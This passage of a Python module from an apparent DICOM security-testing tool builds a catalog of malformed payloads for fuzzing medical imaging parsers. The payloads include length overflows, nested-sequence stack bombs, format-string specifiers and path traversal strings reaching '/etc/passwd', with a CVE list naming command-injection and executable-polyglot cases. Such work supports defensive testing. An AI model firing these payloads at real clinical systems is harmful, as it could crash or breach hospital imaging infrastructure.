# SPDX-License-Identifier: GPL-2.0-only
"""
C-SCARE Attack Catalog - static DICOM security test payloads

This module is a STATIC CATALOG of hand-built malformed DICOM payloads. It
is not a fuzzing engine: there is no mutation loop and no coverage feedback.
The catalog has two roles in C-SCARE:
  * Black-box DAST  - deliver payloads live at a target and watch for
                      anomalies (see c_scare.deliver / runner).
  * Grey-box seeds  - write payloads to disk as the initial corpus for
                      AFL++ / AFLNet, which own the actual mutation loop.

Pre-built attack patterns derived from:
1. DICOM protocol specification edge cases
2. Real-world CVEs (2019-2026)
3. Fuzzer test cases

Attack Categories:
    ParserAttacks      - Target DICOM file/dataset parsers
    ProtocolAttacks    - Target network stack (PDUs, associations)
    MemoryAttacks      - Buffer overflows, allocation exhaustion
    LogicAttacks       - Semantic confusion, state violations
    StorageSCPAbuseAttacks - Unauthenticated C-STORE import/storage abuse
    CommandInjectionAttacks - Shell injection via storescp exec placeholders
    PathTraversalAttacks - Directory traversal in stored DICOM filenames
    StateMachineAttacks - DICOM state machine (Sta1-Sta13) violations
    CVEAttacks         - CVE-specific reproductions

CVE coverage is tagged at two fidelity levels in each payload's metadata:

  metadata['cve']         - a targeted reproduction / probe of a specific CVE.
  metadata['cve_related'] - a generic bug-class payload *inspired by* a CVE but
                            not claiming to reproduce it (e.g. a static buffer
                            cannot reproduce a heap use-after-free); these also
                            carry metadata['bug_class'].

Targeted (metadata['cve']):
    CVE-2019-11687  - Executable embedding (PEDICOM/ELFDICOM/Mach-O/TIFF
                      polyglots) across all five Part-10 safe zones; see
                      c_scare.polyglot for the PE synthesis, zone enumeration
                      and dual-pipeline validation behind these payloads
    CVE-2022-2119   - SCP path traversal in stored DICOM filenames
    CVE-2022-2120   - SCU path traversal (same payload, RawSCP delivery)
    CVE-2023-32135  - Use-After-Free trigger in DCM parsing (structural seed)
    CVE-2024-24793  - Use-After-Free trigger in File Meta Info (structural seed)
    CVE-2024-24794  - Use-After-Free trigger in Sequence parsing (structural seed)
    CVE-2024-33606  - SSRF via URI Value Representation
    CVE-2024-34509  - dcmdata segfault via invalid DIMSE message (black-box analogue)
    CVE-2026-5663   - OS command injection via storescp exec placeholders
    CVE-2026-50003  - C-GET bit-preserving storage path traversal
    CVE-2026-50254  - storescp association-request memory leak
    CVE-2026-35505  - association-request memory leak in single-process SCPs
    CVE-2026-52868  - worklist per-AE storage path traversal
    CVE-2026-44628  - worklist crafted-query type confusion crash
    CVE-2015-8979   - DCMTK dcmnet/DUL string-handling overflow on the wire
                      (lineage: CVE-2019-1010228, CVE-2021-41689)
    CVE-2022-2121   - DCMTK NULL pointer dereference parsing a malformed file
    CVE-2024-47796  - DCMTK determineMinMax improper array index -> OOB write
    CVE-2025-14607  - DCMTK DcmByteString::makeDicomByteString memory corruption
    CVE-2026-3650   - GDCM memory-leak DoS via non-standard VR in file meta
    CVE-2026-5437   - Orthanc DicomStreamReader meta-header OOB read
                      (sibling CVE-2026-5442; batch CVE-2026-5437..5445)
    CVE-2026-10528  - Orthanc/DCMTK stack overflow via DcmItem::read recursion
                      (structural trigger / regression seed, like the UAF entries)
    CVE-2026-32711  - pydicom FileSet/DICOMDIR path traversal via the
                      Referenced File ID (0004,1500); fixed in pydicom 3.0.2/2.4.5
    CVE-2024-28130  - DCMTK dcmpstat type confusion: VOI LUT Sequence (0028,3010)
                      emitted as a non-SQ VR (Talos TALOS-2024-1957)
    CVE-2015-8396   - GDCM ImageRegionReader::ReadIntoBuffer integer overflow
    CVE-2024-22373  - GDCM JPEG2000Codec::DecodeByStreamsCommon OOB write
    CVE-2024-22391  - GDCM LookupTable::SetLUT heap overflow (palette LUT)
    CVE-2024-25569  - GDCM RAWCodec::DecodeBytes OOB read (geometry vs pixeldata)
    CVE-2025-48429  - GDCM RLECodec::DecodeByStreams OOB read (NumberOfSegments>15)
    CVE-2025-52582  - GDCM Overlay::GrabOverlayFromPixelData OOB read
    CVE-2025-11266  - GDCM encapsulated fragment/BOT integer-underflow OOB write
    CVE-2026-5441   - Orthanc DecodePsmctRle1 (Philips PMSCT_RLE1) OOB read
                      (structural trigger)
    CVE-2026-5442   - Orthanc image-decoder integer overflow (dimensions as UL)
    CVE-2026-5443   - Orthanc PALETTE COLOR width*height 32-bit multiply overflow
    CVE-2026-5444   - Orthanc embedded-PAM image dimension overflow
    CVE-2026-5445   - Orthanc DecodeLookupTable palette index past LUT size
                      (Orthanc 5441..5445 are CERT/CC VU#536588, fixed in 1.12.11)
    CVE-2026-50003  - DCMTK C-GET bit-preserving storage path traversal
                      from a malicious SCP to a client/SCU
    CVE-2026-50254  - DCMTK storescp crafted association request memory leak DoS
    CVE-2026-35505  - DCMTK dcmnet crafted association request memory leak DoS
    CVE-2026-52868  - DCMTK worklist filesystem cross-AE path traversal/read
    CVE-2026-44628  - DCMTK worklist C-FIND type confusion crash

  Config-file CVEs exercised by the grey-box dcmqrscp track live under
  fuzz/configs/malformed/: CVE-2020-36855, CVE-2022-4981.

Inspired-by bug classes (metadata['cve_related'], not reproductions):
    CVE-2024-22100  - heap overflow      -> integer-overflow / oversized-value
    CVE-2024-25578  - out-of-bounds write -> length-mismatch / oob-offset / lut-bounds
    CVE-2024-28877  - stack overflow      -> recursion-stack-exhaustion

Example:
    from c_scare.attacks import ParserAttacks, CVEAttacks, ProtocolSeedGenerator
    
    # Generate test corpus
    corpus = ParserAttacks.generate_corpus('/output', count=100)
    
    # CVE-specific tests
    for attack in CVEAttacks.cve_2024_24793_duplicate_meta_tags():
        test_target(attack.payload)
    
    # Seed an AFL++/AFLNet corpus (the engines own the mutation loop)
    for result in ProtocolSeedGenerator.all(count=100):
        save_seed(result.payload)
"""

from dataclasses import dataclass, field
from typing import Any, Dict, Generator, List, Optional, Tuple, Union
import base64
import random
import struct
import os

from .element import Element, Dataset, Tag, VR
from .corruptor import Corruptor, Override, Injection, InjectionPoint
from .pixel import EncapsulatedPixelData, Fragment
from .file import DicomFile
from .monitor import ProtocolMonitor
from .polyglot import (
    ELF_HEADER_LEN, ELF_PHDR_LEN, ELF_TYPE_DYN, ELF_TYPE_EXEC, FILE_ALIGNMENT,
    align_up, dos_header, dos_stub, elf_fragments, elf_header, elf_image,
    embed_in_carrier, filler, inspect_carrier, macho_header, macho_image,
    pe_fragments, pe_headers_len, pe_image, shannon_entropy,
)

# Scapy imports - may not be available in all environments
try:
    from .scapy_dicom import (
        DICOM, A_ASSOCIATE_RQ, A_ASSOCIATE_AC, A_ASSOCIATE_RJ,
        P_DATA_TF, A_RELEASE_RQ, A_RELEASE_RP, A_ABORT,
        C_ECHO_RQ, C_ECHO_RSP, C_STORE_RQ, C_FIND_RQ, C_MOVE_RQ,
        N_CREATE_RQ, N_SET_RQ, N_ACTION_RQ, N_GET_RQ, N_DELETE_RQ,
        N_EVENT_REPORT_RQ,
        PresentationDataValueItem, DICOMSocket,
        DICOMVariableItem, DICOMApplicationContext, DICOMUserInformation,
        DICOMPresentationContextRQ, DICOMAbstractSyntax, DICOMTransferSyntax,
        DICOMMaximumLength, DICOMImplementationClassUID,
        build_presentation_context_rq, build_user_information,
        DEFAULT_TRANSFER_SYNTAX_UID, VERIFICATION_SOP_CLASS_UID,
        IMPLICIT_VR_LITTLE_ENDIAN_UID, EXPLICIT_VR_LITTLE_ENDIAN_UID,
        CT_IMAGE_STORAGE_SOP_CLASS_UID, IMPLEMENTATION_CLASS_UID,
        MR_IMAGE_STORAGE_SOP_CLASS_UID, SECONDARY_CAPTURE_SOP_CLASS_UID,
        MODALITY_WORKLIST_FIND_SOP_CLASS_UID,
        MPPS_SOP_CLASS_UID, STORAGE_COMMITMENT_SOP_CLASS_UID,
        STORAGE_COMMITMENT_SOP_INSTANCE_UID,
        raw_ae_title, raw_item, raw_presentation_context,
        raw_user_information, raw_associate_rq_with_items,
        raw_associate_rq, raw_release_rq,
        _uid_to_bytes,
    )
    SCAPY_DICOM_AVAILABLE = True
except Exception:
    SCAPY_DICOM_AVAILABLE = False
    DEFAULT_TRANSFER_SYNTAX_UID = '1.2.840.10008.1.2'
    IMPLICIT_VR_LITTLE_ENDIAN_UID = '1.2.840.10008.1.2'
    EXPLICIT_VR_LITTLE_ENDIAN_UID = '1.2.840.10008.1.2.1'
    VERIFICATION_SOP_CLASS_UID = '1.2.840.10008.1.1'
    CT_IMAGE_STORAGE_SOP_CLASS_UID = '1.2.840.10008.5.1.4.1.1.2'
    MR_IMAGE_STORAGE_SOP_CLASS_UID = '1.2.840.10008.5.1.4.1.1.4'
    SECONDARY_CAPTURE_SOP_CLASS_UID = '1.2.840.10008.5.1.4.1.1.7'
    MODALITY_WORKLIST_FIND_SOP_CLASS_UID = '1.2.840.10008.5.1.4.32.1'
    IMPLEMENTATION_CLASS_UID = '1.2.3.4.5.6.7.8.9'

try:
    from scapy.packet import raw, fuzz, Packet
    from scapy.volatile import RandByte, RandShort, RandInt, RandString
    SCAPY_PACKET_AVAILABLE = True
except Exception:
    SCAPY_PACKET_AVAILABLE = False
    raw = bytes
    def fuzz(pkt): return pkt

SCAPY_AVAILABLE = SCAPY_DICOM_AVAILABLE and SCAPY_PACKET_AVAILABLE

__all__ = [
    'AttackResult',
    # Attack pattern classes
    'ParserAttacks',
    'ProtocolAttacks',
    'NegotiationAttacks',
    'MemoryAttacks',
    'LogicAttacks',
    'StorageSCPAbuseAttacks',
    'CommandInjectionAttacks',
    'PathTraversalAttacks',
    'StateMachineAttacks',
    'DimseNAttacks',
    'CVEAttacks',
    # Seed generators (corpus emitters for AFL++/AFLNet; not fuzzing engines)
    'ProtocolSeedGenerator',
    'TargetedSeedGenerator',
    'CombinedAttacks',
    # Deprecated aliases
    'ProtocolFuzzer',
    'TargetedFuzzer',
]


@dataclass
class AttackResult:
    """Result of an attack test."""
    name: str
    category: str
    payload: bytes
    description: str
    expected_behavior: str
    metadata: Dict[str, Any] = field(default_factory=dict)
    response: Optional[bytes] = None
    success: Optional[bool] = None
    monitor_reports: List[Any] = field(default_factory=list)

    @property
    def cve(self) -> Optional[str]:
        """Get CVE reference if present."""
        return self.metadata.get('cve')


# =============================================================================
# Part-10 file construction
# =============================================================================
#
# PS3.10 §7.1 makes the File Meta Information a precondition, not decoration:
# a reader that cannot find (0002,0000) Group Length and (0002,0010) Transfer
# Syntax UID does not know how to decode the Data Set and is entitled to stop
# at the header. A payload that skips the meta group therefore never reaches
# the parser it is aimed at, and the run reports a rejection that proves
# nothing about the bug under test.
#
# These build the conformant carrier once so a payload only has to express its
# own malformation.

PART10_PREAMBLE_LEN = 128
DICM_PREFIX = b'DICM'
FILE_META_VERSION = b'\x00\x01'
IMPLEMENTATION_CLASS_UID = '1.2.3.4.5.6.7.8.9'
EXPLICIT_VR_LE_UID = '1.2.840.10008.1.2.1'


def standard_file_meta(sop_class_uid: str = SECONDARY_CAPTURE_SOP_CLASS_UID,
                       sop_instance_uid: str = '1.2.3.4.5',
                       transfer_syntax: str = EXPLICIT_VR_LE_UID
                       ) -> List[Element]:
    """The Type 1 File Meta elements PS3.10 §7.1 requires, in tag order.

    Returned as a list rather than a Dataset because several payloads need
    *duplicate* meta elements, which a tag-keyed container cannot hold.
    """
    return [
        Element(0x0002, 0x0001, 'OB', FILE_META_VERSION),
        Element(0x0002, 0x0002, 'UI', sop_class_uid),
        Element(0x0002, 0x0003, 'UI', sop_instance_uid),
        Element(0x0002, 0x0010, 'UI', transfer_syntax),
        Element(0x0002, 0x0012, 'UI', IMPLEMENTATION_CLASS_UID),
    ]


def part10_file(meta_elements: List[Element], dataset: bytes = b'',
                preamble: bytes = b'\x00' * PART10_PREAMBLE_LEN,
                group_length: Optional[int] = None) -> bytes:
    """A Part-10 file whose File Meta group is exactly ``meta_elements``.

    Emits the 128-byte preamble, the ``DICM`` prefix, a correct (0002,0000)
    Group Length over the encoded group, then the Data Set. The File Meta
    group is always Explicit VR Little Endian regardless of what
    (0002,0010) declares for the Data Set, per PS3.10 §7.1.

    Unlike :class:`DicomFile`'s builder this does not deduplicate by tag,
    because several payloads *are* duplicate meta elements — and a group
    length that spans them is exactly what gets a strict reader far enough to
    insert the second one. Pass ``group_length`` to state a value other than
    the truth, for payloads whose malformation is the length itself.
    """
    body = b''.join(e.encode(implicit_vr=False, little_endian=True)
                    for e in meta_elements)
    declared = len(body) if group_length is None else group_length
    header = Element(0x0002, 0x0000, 'UL', declared).encode(
        implicit_vr=False, little_endian=True)
    return (preamble[:PART10_PREAMBLE_LEN].ljust(PART10_PREAMBLE_LEN, b'\x00')
            + DICM_PREFIX + header + body + dataset)


#: Fixed UID root for synthesised carriers, so a run is reproducible and the
#: objects are traceable to this tool rather than colliding with real studies.
CARRIER_UID_ROOT = '1.2.826.0.1.3680043.10.1337'


def secondary_capture_carrier(rows: int = 16, columns: int = 16,
                              sop_instance_uid: str = None,
                              transfer_syntax: str = EXPLICIT_VR_LE_UID
                              ) -> bytes:
    """A complete Secondary Capture object a PACS has no reason to refuse.

    Built with pydicom so the encoding is not this project's opinion of the
    standard. Everything the Secondary Capture IOD makes Type 1 or Type 2 is
    present — the SOP Common, Patient, Study, Series and General Image
    modules, plus an Image Pixel module whose Pixel Data length actually
    matches ``Rows × Columns × SamplesPerPixel × BitsAllocated / 8``.

    That last part is the difference between a carrier and a stub. An archive
    validates against the IOD before it looks at anything else, so a synthetic
    object missing Study/Series UIDs or Pixel Data is rejected as incomplete
    and an embedded payload never gets read. Requiring a real image also makes
    the polyglot honest: it is what a technologist would see rendered.
    """
    from io import BytesIO

    import pydicom
    from pydicom.dataset import Dataset as PydicomDataset, FileMetaDataset

    instance = sop_instance_uid or f'{CARRIER_UID_ROOT}.1.1'

    meta = FileMetaDataset()
    meta.MediaStorageSOPClassUID = SECONDARY_CAPTURE_SOP_CLASS_UID
    meta.MediaStorageSOPInstanceUID = instance
    meta.TransferSyntaxUID = transfer_syntax
    meta.ImplementationClassUID = IMPLEMENTATION_CLASS_UID

    ds = PydicomDataset()
    ds.file_meta = meta
    ds.preamble = b'\x00' * PART10_PREAMBLE_LEN

    # SOP Common — the dataset UIDs must agree with the File Meta group, or a
    # receiver that cross-checks them rejects the object.
    ds.SOPClassUID = SECONDARY_CAPTURE_SOP_CLASS_UID
    ds.SOPInstanceUID = instance
    ds.SpecificCharacterSet = 'ISO_IR 100'

    # Patient / Study / Series — Type 2 means present, and may be empty; the
    # UID chain is Type 1 and may not.
    ds.PatientName = 'Test^Polyglot'
    ds.PatientID = 'C-SCARE-0001'
    ds.PatientBirthDate = ''
    ds.PatientSex = ''
    ds.StudyInstanceUID = f'{CARRIER_UID_ROOT}.1'
    ds.SeriesInstanceUID = f'{CARRIER_UID_ROOT}.1.2'
    ds.StudyDate = '20260101'
    ds.StudyTime = '120000'
    ds.AccessionNumber = ''
    ds.ReferringPhysicianName = ''
    ds.StudyID = '1'
    ds.SeriesNumber = '1'
    ds.InstanceNumber = '1'
    ds.Modality = 'OT'
    ds.ConversionType = 'WSD'          # Type 1 for Secondary Capture

    # Image Pixel module. A simple gradient rather than a constant fill, so the
    # rendered image is visibly an image and the pixel data has an ordinary
    # byte distribution instead of a flat one.
    ds.SamplesPerPixel = 1
    ds.PhotometricInterpretation = 'MONOCHROME2'
    ds.Rows = rows
    ds.Columns = columns
    ds.BitsAllocated = 8
    ds.BitsStored = 8
    ds.HighBit = 7
    ds.PixelRepresentation = 0
    ds.PixelData = bytes(
        ((x * 255) // max(columns - 1, 1) + (y * 255) // max(rows - 1, 1)) // 2
        for y in range(rows) for x in range(columns))

    buffer = BytesIO()
    ds.save_as(buffer, enforce_file_format=True)
    return buffer.getvalue()


def minimal_dataset() -> bytes:
    """A small conformant Secondary Capture Data Set, in ascending tag order.

    Payloads whose malformation lives in the File Meta group still need a Data
    Set after it: the meta group is a header *for* something, and a reader
    that clears it with nothing behind it has not exercised the parser.
    """
    return b''.join(e.encode(implicit_vr=False, little_endian=True) for e in [
        Element(0x0008, 0x0016, 'UI', SECONDARY_CAPTURE_SOP_CLASS_UID),
        Element(0x0008, 0x0018, 'UI', '1.2.3.4.5'),
        Element(0x0008, 0x0060, 'CS', 'OT'),
        Element(0x0010, 0x0010, 'PN', 'Doe^John'),
        Element(0x0010, 0x0020, 'LO', '12345'),
    ])


# =============================================================================
# Parser Attacks - Target DICOM file/dataset parsers
# =============================================================================

class ParserAttacks:
    """
    Attacks targeting DICOM parsers (viewers, PACS, libraries).
    
    These generate malformed DICOM files/datasets that may crash or
    confuse parsers.
    """
    
    @staticmethod
    def invalid_vr(vr: str = 'XX') -> AttackResult:
        """Element with invalid VR code."""
        ds = Dataset() / Element.raw(
            tag=0x00100010,
            vr=vr,
            value=b'Test^Patient'
        )
        return AttackResult(
            name='invalid_vr',
            category='parser',
            payload=ds.encode(),
            description=f'PatientName with invalid VR "{vr}"',
            expected_behavior='Parser should reject or handle gracefully',
            metadata={'vr': vr}
        )
    
    @staticmethod
    def length_overflow(declared: int = 0xFFFFFFFF, actual: int = 10) -> AttackResult:
        """Length field larger than actual data."""
        ds = Dataset() / Element.raw(
            tag=0x00100010,
            vr='PN',
            length=declared,
            value=b'X' * actual
        )
        return AttackResult(
            name='length_overflow',
            category='parser',
            payload=ds.encode(),
            description=f'Declared length {declared:#x}, actual {actual}',
            expected_behavior='Parser should detect length mismatch',
            metadata={'declared': declared, 'actual': actual}
        )
    
    @staticmethod
    def length_underflow(declared: int = 1, actual: int = 1000) -> AttackResult:
        """Length field smaller than actual data."""
        ds = Dataset() / Element.raw(
            tag=0x00100010,
            vr='PN',
            length=declared,
            value=b'X' * actual
        )
        return AttackResult(
            name='length_underflow',
            category='parser',
            payload=ds.encode(),
            description=f'Declared length {declared}, actual {actual}',
            expected_behavior='Parser may read beyond declared boundary',
            metadata={'declared': declared, 'actual': actual}
        )
    
    @staticmethod
    def undefined_length_abuse() -> AttackResult:
        """Undefined length without proper delimitation."""
        data = struct.pack('<HH', 0x0010, 0x0010)  # Tag
        data += b'LO'  # VR
        data += b'\x00\x00'  # Reserved
        data += struct.pack('<I', 0xFFFFFFFF)  # Undefined length
        data += b'AAAA' * 100  # Data without delimiter
        
        return AttackResult(
            name='undefined_length_abuse',
            category='parser',
            payload=data,
            description='Undefined length without sequence delimiter',
            expected_behavior='Parser should timeout or reject',
            metadata={
                'coverage_scope': 'undefined-length-handling',
                'bug_class': 'unterminated-undefined-length',
                'target_field': '(7FE0,0010) Pixel Data',
                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                'sop_instance_uid': '1.2.3.4.5',
            },
        )
    
    @staticmethod
    def sequence_bomb(depth: int = 500) -> AttackResult:
        """Deeply nested sequences (stack overflow attempt)."""
        data = b''
        for _ in range(depth):
            data += struct.pack('<HH', 0x0040, 0xA730)  # Content Sequence
            data += b'SQ'
            data += b'\x00\x00'
            data += struct.pack('<I', 0xFFFFFFFF)  # Undefined length
            data += struct.pack('<HH', 0xFFFE, 0xE000)  # Item tag
            data += struct.pack('<I', 0xFFFFFFFF)  # Undefined length
        
        for _ in range(depth):
            data += struct.pack('<HH', 0xFFFE, 0xE00D)  # Item delim
            data += struct.pack('<I', 0)
            data += struct.pack('<HH', 0xFFFE, 0xE0DD)  # Sequence delim
            data += struct.pack('<I', 0)
        
        return AttackResult(
            name='sequence_bomb',
            category='parser',
            payload=data,
            description=f'Sequence nested {depth} levels deep',
            expected_behavior='Parser may stack overflow or hang',
            metadata={'depth': depth, 'bug_class': 'recursion-stack-exhaustion',
                      'cve_related': 'CVE-2024-28877'}
        )
    
    @staticmethod
    def tag_out_of_order() -> AttackResult:
        """Tags not in ascending order."""
        ds = Dataset()
        ds._force_append(Element(0x0020, 0x000D, 'UI', '1.2.3'))  # Study UID
        ds._force_append(Element(0x0010, 0x0010, 'PN', 'Doe^John'))  # Patient Name
        
        return AttackResult(
            name='tag_out_of_order',
            category='parser',
            payload=ds.encode(),
            description='Tags in descending order',
            expected_behavior='Parser should reject or sort',
            metadata={
                'coverage_scope': 'element-ordering',
                'bug_class': 'descending-tag-order',
                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                'sop_instance_uid': '1.2.3.4.5',
            },
        )
    
    @staticmethod
    def duplicate_tag() -> AttackResult:
        """Same tag appears twice (duplicate-tag handling; lineage:
        CVE-2024-24793, whose targeted reproduction lives in CVEAttacks)."""
        ds = Dataset()
        ds._force_append(Element(0x0010, 0x0010, 'PN', 'Doe^John'))
        ds._force_append(Element(0x0010, 0x0010, 'PN', 'Evil^Patient'))
        
        return AttackResult(
            name='duplicate_tag',
            category='parser',
            payload=ds.encode(),
            description='PatientName appears twice',
            expected_behavior='Parser behavior undefined - may use either',
            metadata={'bug_class': 'duplicate-tag', 'cve_related': 'CVE-2024-24793'}
        )
    
    @staticmethod
    def null_in_string() -> AttackResult:
        """Null bytes embedded in string value."""
        ds = Dataset() / Element(0x0010, 0x0010, 'PN', 'Doe\x00^John\x00\x00')
        
        return AttackResult(
            name='null_in_string',
            category='parser',
            payload=ds.encode(),
            description='Null bytes in PatientName',
            expected_behavior='Parser may truncate or include nulls',
            metadata={
                'coverage_scope': 'string-value-sanitization',
                'bug_class': 'embedded-null-truncation',
                'target_field': '(0010,0010) Patient Name',
                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                'sop_instance_uid': '1.2.3.4.5',
            },
        )
    
    @staticmethod
    def format_string_injection() -> AttackResult:
        """Format string patterns in string VR."""
        ds = Dataset()
        ds = ds / Element(0x0008, 0x1030, 'LO', '%s%s%s%s%s%s%s%s%n')  # Study Description
        ds = ds / Element(0x0010, 0x0010, 'PN', '%x%x%x%x%x%x%x%x')  # Patient Name
        
        return AttackResult(
            name='format_string_injection',
            category='parser',
            payload=ds.encode(),
            description='Format string patterns in string tags',
            expected_behavior='Parser should not interpret as format strings',
            metadata={'bug_class': 'format-string'}
        )
    
    @staticmethod
    def path_traversal_in_string() -> AttackResult:
        """Path traversal patterns in string VR."""
        ds = Dataset()
        ds = ds / Element(0x0008, 0x1010, 'SH', '../../../etc/passwd')  # Station Name
        ds = ds / Element(0x0010, 0x0010, 'PN', '..\\..\\..\\Windows\\System32')
        
        return AttackResult(
            name='path_traversal_in_string',
            category='parser',
            payload=ds.encode(),
            description='Path traversal sequences in string tags',
            expected_behavior='Parser should sanitize paths',
            metadata={'bug_class': 'path-traversal', 'cve_related': 'CVE-2022-2119'}
        )
    
    @staticmethod
    def unicode_expansion() -> AttackResult:
        """Short UTF-8 that expands to long UTF-16."""
        # UTF-8 sequences that expand significantly
        value = '\u0100' * 1000  # Each char is 2 bytes UTF-8, 2 bytes UTF-16
        ds = Dataset() / Element(0x0010, 0x0010, 'PN', value)
        
        return AttackResult(
            name='unicode_expansion',
            category='parser',
            payload=ds.encode(),
            description='Unicode that may expand during conversion',
            expected_behavior='Parser should handle encoding safely',
            metadata={'bug_class': 'charset-expansion'}
        )
    
    @staticmethod
    def generate_corpus(output_dir: str, count: int = 100) -> List[AttackResult]:
        """Generate fuzzing corpus of malformed DICOM files."""
        os.makedirs(output_dir, exist_ok=True)
        results = []
        
        attacks = [
            ('invalid_vr_XX', lambda: ParserAttacks.invalid_vr('XX')),
            ('invalid_vr_00', lambda: ParserAttacks.invalid_vr('\x00\x00')),
            ('length_overflow', lambda: ParserAttacks.length_overflow()),
            ('length_underflow', lambda: ParserAttacks.length_underflow()),
            ('undefined_length', ParserAttacks.undefined_length_abuse),
            ('sequence_bomb_10', lambda: ParserAttacks.sequence_bomb(10)),
            ('sequence_bomb_100', lambda: ParserAttacks.sequence_bomb(100)),
            ('tag_out_of_order', ParserAttacks.tag_out_of_order),
            ('duplicate_tag', ParserAttacks.duplicate_tag),
            ('null_in_string', ParserAttacks.null_in_string),
            ('format_string', ParserAttacks.format_string_injection),
            ('path_traversal', ParserAttacks.path_traversal_in_string),
        ]
        
        for name, attack_fn in attacks:
            if len(results) >= count:
                break
            result = attack_fn()
            filepath = os.path.join(output_dir, f'{name}.dcm')
            
            file_data = b'\x00' * 128 + b'DICM' + result.payload
            
            with open(filepath, 'wb') as f:
                f.write(file_data)
            
            result.metadata['filepath'] = filepath
            results.append(result)
        
        return results

    # -------------------------------------------------------------------------
    # Encoding-level confusion: the dataset disagrees with its declared syntax
    # -------------------------------------------------------------------------

    @staticmethod
    def sequence_depth_bomb(depth: int = 512) -> AttackResult:
        """Sequences nested ``depth`` levels deep, all undefined-length.

        Distinct from ``sequence_bomb``, which is wide rather than deep: a
        recursive-descent parser recurses once per level here, so the cost is
        stack rather than heap. Undefined lengths mean the depth is not
        knowable until the parser has already descended.
        """
        item_tag = struct.pack('<HHI', 0xFFFE, 0xE000, 0xFFFFFFFF)
        item_end = struct.pack('<HHI', 0xFFFE, 0xE00D, 0)
        sq_open = struct.pack('<HH2sHI', 0x0040, 0xA730, b'SQ', 0, 0xFFFFFFFF)
        sq_end = struct.pack('<HHI', 0xFFFE, 0xE0DD, 0)

        payload = b''
        for _ in range(depth):
            payload = sq_open + item_tag + payload + item_end + sq_end
        return AttackResult(
            name='sequence_depth_bomb',
            category='parser',
            payload=payload,
            description=f'Content Sequence nested {depth} levels deep, every '
                        'level undefined-length',
            expected_behavior='Parser should enforce a maximum nesting depth '
                              'rather than recurse per level',
            metadata={
                'depth': depth,
                'target_field': '(0040,A730) Content Sequence',
                'bug_class': 'unbounded-recursion',
                'coverage_scope': 'sequence-nesting-depth',
                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                'sop_instance_uid': '1.2.3.4.5',
            },
        )

    @staticmethod
    def explicit_vr_in_implicit_dataset() -> AttackResult:
        """Explicit-VR elements inside a dataset declared Implicit VR.

        Under Implicit VR the two bytes after the tag are the low half of a
        32-bit length, so a VR of 'SH' reads as length 0x00004853 - about 18 KB
        claimed from an element that carries 8.
        """
        payload = b''
        payload += struct.pack('<HHI', 0x0008, 0x0016, 26) + \
            SECONDARY_CAPTURE_SOP_CLASS_UID.encode('ascii')
        payload += struct.pack('<HH2sH', 0x0010, 0x0010, b'SH', 8) + b'Doe^John'
        payload += struct.pack('<HHI', 0x0010, 0x0020, 6) + b'ID0001'
        return AttackResult(
            name='explicit_vr_in_implicit_dataset',
            category='parser',
            payload=payload,
            description='Implicit VR dataset containing one explicitly-typed '
                        "element, whose VR bytes read as a ~18KB length",
            expected_behavior='Parser must bound each element length by the '
                              'remaining dataset rather than trusting it',
            metadata={
                'target_field': '(0010,0010) Patient Name',
                'bug_class': 'transfer-syntax-confusion',
                'coverage_scope': 'vr-encoding-confusion',
                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                'sop_instance_uid': '1.2.3.4.5',
            },
        )

    @staticmethod
    def byte_swapped_lengths() -> AttackResult:
        """Big-endian element headers inside a little-endian dataset.

        A length of 8 written big-endian reads as 0x0800 (2048) little-endian,
        so every element overruns; this reaches the same code as a genuine
        endianness misdetection without needing the peer to negotiate
        Explicit VR Big Endian.
        """
        payload = b''
        payload += struct.pack('>HH2sH', 0x0800, 0x0500, b'UI', 26) + \
            SECONDARY_CAPTURE_SOP_CLASS_UID.encode('ascii')
        payload += struct.pack('>HH2sH', 0x1000, 0x1000, b'PN', 8) + b'Doe^John'
        return AttackResult(
            name='byte_swapped_lengths',
            category='parser',
            payload=payload,
            description='Element headers encoded big-endian inside a dataset '
                        'declared little-endian',
            expected_behavior='Parser should fail on the resulting overruns '
                              'rather than read past the buffer',
            metadata={
                'bug_class': 'endianness-confusion',
                'coverage_scope': 'byte-order-confusion',
                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                'sop_instance_uid': '1.2.3.4.5',
            },
        )

    @staticmethod
    def group_length_mismatch() -> AttackResult:
        """A group length element that disagrees with the group it counts.

        Group length elements are retired but still parsed. Code that trusts
        one to size a group buffer, then copies the elements that actually
        follow, has a mismatch to exploit in either direction.
        """
        group_body = struct.pack('<HH2sH', 0x0010, 0x0010, b'PN', 8) + b'Doe^John'
        group_body += struct.pack('<HH2sH', 0x0010, 0x0020, b'LO', 6) + b'ID0001'
        payload = struct.pack('<HH2sHI', 0x0010, 0x0000, b'UL', 4, 0xFFFFFF00)
        payload += group_body
        return AttackResult(
            name='group_length_mismatch',
            category='parser',
            payload=payload,
            description=f'(0010,0000) Group Length claims 0xFFFFFF00 bytes; the '
                        f'group holds {len(group_body)}',
            expected_behavior='Parser should ignore or re-derive group length, '
                              'never size an allocation or copy from it',
            metadata={
                'target_field': '(0010,0000) Group Length',
                'declared_length': 0xFFFFFF00,
                'actual_length': len(group_body),
                'bug_class': 'length-vs-content-mismatch',
                'coverage_scope': 'group-length-handling',
                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                'sop_instance_uid': '1.2.3.4.5',
            },
        )

    @staticmethod
    def odd_length_values() -> AttackResult:
        """Odd-length values, which PS3.5 7.1.1 forbids.

        Every DICOM value is even-length; readers that assume it and step in
        two-byte units lose tag alignment for the rest of the dataset, so each
        subsequent element is read from the middle of the previous one.
        """
        payload = b''
        payload += struct.pack('<HH2sH', 0x0010, 0x0010, b'PN', 7) + b'Doe^Joh'
        payload += struct.pack('<HH2sH', 0x0010, 0x0020, b'LO', 5) + b'ID001'
        payload += struct.pack('<HH2sH', 0x0008, 0x0060, b'CS', 3) + b'CTX'
        return AttackResult(
            name='odd_length_values',
            category='parser',
            payload=payload,
            description='Three consecutive elements with odd value lengths '
                        '(PS3.5 7.1.1 requires even padding)',
            expected_behavior='Parser should reject odd lengths or realign '
                              'without misreading the following elements',
            metadata={
                'bug_class': 'alignment-desync',
                'coverage_scope': 'value-length-parity',
                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                'sop_instance_uid': '1.2.3.4.5',
            },
        )

    @staticmethod
    def sequence_delimiter_in_defined_length() -> AttackResult:
